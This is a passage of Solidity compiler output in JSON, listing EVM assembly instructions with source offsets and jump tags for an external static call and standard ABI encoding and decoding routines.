											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "STATICCALL",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 377,
											"end": 422,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 377,
											"end": 422,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 440,
											"end": 446,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 433,
											"end": 446,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 433,
											"end": 446,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 433,
											"end": 446,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 144,
											"name": "tag",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 7,
											"end": 144,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 7,
											"end": 144,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 92,
											"end": 98,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 86,
											"end": 99,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 77,
											"end": 99,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 77,
											"end": 99,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 108,
											"end": 138,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 132,
											"end": 137,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 108,
											"end": 138,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "43"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "tag",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 150,
											"end": 293,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 150,
											"end": 293,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 150,
											"end": 293,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 238,
											"end": 244,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 232,
											"end": 245,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 223,
											"end": 245,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 223,
											"end": 245,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 254,
											"end": 287,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 281,
											"end": 286,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 254,
											"end": 287,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 254,
											"end": 287,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 254,
											"end": 287,
											"name": "tag",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 254,
											"end": 287,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 213,
											"end": 293,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 213,
											"end": 293,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 213,
											"end": 293,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 213,
											"end": 293,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 213,
											"end": 293,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 299,
											"end": 577,
											"name": "tag",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 299,
											"end": 577,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 299,
											"end": 577,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 415,
											"end": 417,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 403,
											"end": 412,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 394,
											"end": 401,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 390,
											"end": 413,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 386,
											"end": 418,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 383,
											"end": 385,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 383,
											"end": 385,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 383,
											"end": 385,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 431,
											"end": 432,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 428,
											"end": 429,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 421,
											"end": 433,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 383,
											"end": 385,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 383,
											"end": 385,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 474,
											"end": 475,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 499,
											"end": 560,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 552,
											"end": 559,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 543,
											"end": 549,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 532,
											"end": 541,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 528,
											"end": 550,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 499,
											"end": 560,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 499,
											"end": 560,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 499,
											"end": 560,
											"name": "tag",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 499,
											"end": 560,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 489,
											"end": 560,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 489,
											"end": 560,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 445,
											"end": 570,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 373,
											"end": 577,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 373,
											"end": 577,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 373,
											"end": 577,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 373,
											"end": 577,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 373,
											"end": 577,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 583,
											"end": 867,
											"name": "tag",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 583,
											"end": 867,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 583,
											"end": 867,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 702,
											"end": 704,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 690,
											"end": 699,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 681,
											"end": 688,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 677,
											"end": 700,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 673,
											"end": 705,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 670,
											"end": 672,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 670,
											"end": 672,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 670,
											"end": 672,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 718,
											"end": 719,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 715,
											"end": 716,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 708,
											"end": 720,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 670,
											"end": 672,
											"name": "tag",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 670,
											"end": 672,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 761,
											"end": 762,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 786,
											"end": 850,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 842,
											"end": 849,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 833,
											"end": 839,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 822,
											"end": 831,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 818,
											"end": 840,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 786,
											"end": 850,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 786,
											"end": 850,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 786,
											"end": 850,
											"name": "tag",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 786,
											"end": 850,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 776,
											"end": 850,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 776,
											"end": 850,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 732,
											"end": 860,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 660,
											"end": 867,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 660,
											"end": 867,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 660,
											"end": 867,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 660,
											"end": 867,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 660,
											"end": 867,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 873,
											"end": 991,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 873,
											"end": 991,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 960,
											"end": 984,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 978,
											"end": 983,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 960,
											"end": 984,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "57"
										},
										{
											"begin": 960,
											"end": 984,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 960,
											"end": 984,
											"name": "tag",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 960,
											"end": 984,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 955,
											"end": 958,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 948,
											"end": 985,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 938,
											"end": 991,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 938,
											"end": 991,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 938,
											"end": 991,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 997,
											"end": 1154,
											"name": "tag",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 997,
											"end": 1154,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1097,
											"end": 1147,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1141,
											"end": 1146,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1097,
											"end": 1147,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "61"
										},
										{
											"begin": 1097,
											"end": 1147,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1097,
											"end": 1147,
											"name": "tag",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1097,
											"end": 1147,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1092,
											"end": 1095,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1085,
											"end": 1148,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1075,
											"end": 1154,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1075,
											"end": 1154,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1075,
											"end": 1154,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1160,
											"end": 1278,
											"name": "tag",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 1160,
											"end": 1278,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1247,
											"end": 1271,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1265,
											"end": 1270,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1247,
											"end": 1271,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 1247,
											"end": 1271,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1247,
											"end": 1271,
											"name": "tag",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1247,
											"end": 1271,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1242,
											"end": 1245,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1235,
											"end": 1272,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1225,
											"end": 1278,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1225,
											"end": 1278,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1225,
											"end": 1278,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1284,
											"end": 1506,
											"name": "tag",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 1284,
											"end": 1506,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1284,
											"end": 1506,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1415,
											"end": 1417,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1404,
											"end": 1413,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1400,
											"end": 1418,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1392,
											"end": 1418,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1392,
											"end": 1418,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1428,
											"end": 1499,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "67"
										},
										{
											"begin": 1496,
											"end": 1497,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1485,
											"end": 1494,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1481,
											"end": 1498,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1472,
											"end": 1478,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1428,
											"end": 1499,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1428,
											"end": 1499,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1428,
											"end": 1499,
											"name": "tag",
											"source": 2,
											"value": "67"
										},
										{
											"begin": 1428,
											"end": 1499,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1382,
											"end": 1506,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1382,
											"end": 1506,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1382,
											"end": 1506,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1382,
											"end": 1506,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1382,
											"end": 1506,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1512,
											"end": 1954,
											"name": "tag",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 1512,
											"end": 1954,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1512,
											"end": 1954,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1699,
											"end": 1701,
											"name": "PUSH",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1688,
											"end": 1697,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1684,
											"end": 1702,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1676,
											"end": 1702,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1676,
											"end": 1702,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1712,
											"end": 1783,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "69"
										},
										{
											"begin": 1780,
											"end": 1781,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1769,
											"end": 1778,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1765,
											"end": 1782,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1756,
											"end": 1762,
											"name": "DUP7",
											"source": 2
										},
										{
											"begin": 1712,
											"end": 1783,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1712,
											"end": 1783,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1712,
											"end": 1783,
											"name": "tag",
											"source": 2,
											"value": "69"
										},
										{
											"begin": 1712,
											"end": 1783,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1793,
											"end": 1865,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 1861,
											"end": 1863,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1850,
											"end": 1859,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1846,
											"end": 1864,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1837,
											"end": 1843,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 1793,
											"end": 1865,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1793,
											"end": 1865,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1793,
											"end": 1865,
											"name": "tag",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 1793,
											"end": 1865,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1875,
											"end": 1947,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 1943,
											"end": 1945,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 1932,
											"end": 1941,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1928,
											"end": 1946,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1919,
											"end": 1925,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1875,
											"end": 1947,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 1875,
											"end": 1947,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1875,
											"end": 1947,
											"name": "tag",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 1875,
											"end": 1947,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1954,
											"name": "SWAP5",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1954,
											"name": "SWAP4",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1954,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1954,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1954,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1954,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1954,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1960,
											"end": 2292,
											"name": "tag",
											"source": 2,
											"value": "19"
										},
										{
											"begin": 1960,
											"end": 2292,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1960,
											"end": 2292,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2119,
											"end": 2121,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 2108,
											"end": 2117,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2104,
											"end": 2122,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2096,
											"end": 2122,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2096,
											"end": 2122,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2132,
											"end": 2203,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "73"
										},
										{
											"begin": 2200,
											"end": 2201,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2189,
											"end": 2198,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2185,
											"end": 2202,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2176,
											"end": 2182,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 2132,
											"end": 2203,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 2132,
											"end": 2203,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2132,
											"end": 2203,
											"name": "tag",
											"source": 2,
											"value": "73"
										},
										{
											"begin": 2132,
											"end": 2203,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2213,
											"end": 2285,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "74"
										},
										{
											"begin": 2281,
											"end": 2283,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 2270,
											"end": 2279,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2266,
											"end": 2284,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2257,
											"end": 2263,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 2213,
											"end": 2285,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 2213,
											"end": 2285,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2213,
											"end": 2285,
											"name": "tag",
											"source": 2,
											"value": "74"
										},
										{
											"begin": 2213,
											"end": 2285,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2086,
											"end": 2292,
											"name": "SWAP4",
											"source": 2
										},
										{
											"begin": 2086,
											"end": 2292,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2086,
											"end": 2292,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2086,
											"end": 2292,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2086,
											"end": 2292,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2086,
											"end": 2292,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2298,
											"end": 2546,
											"name": "tag",
											"source": 2,
											"value": "9"
										},
										{
											"begin": 2298,
											"end": 2546,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2298,
											"end": 2546,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2442,
											"end": 2444,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 2431,
											"end": 2440,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2427,
											"end": 2445,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2419,
											"end": 2445,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2419,
											"end": 2445,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2455,
											"end": 2539,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "76"
										},
										{
											"begin": 2536,
											"end": 2537,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
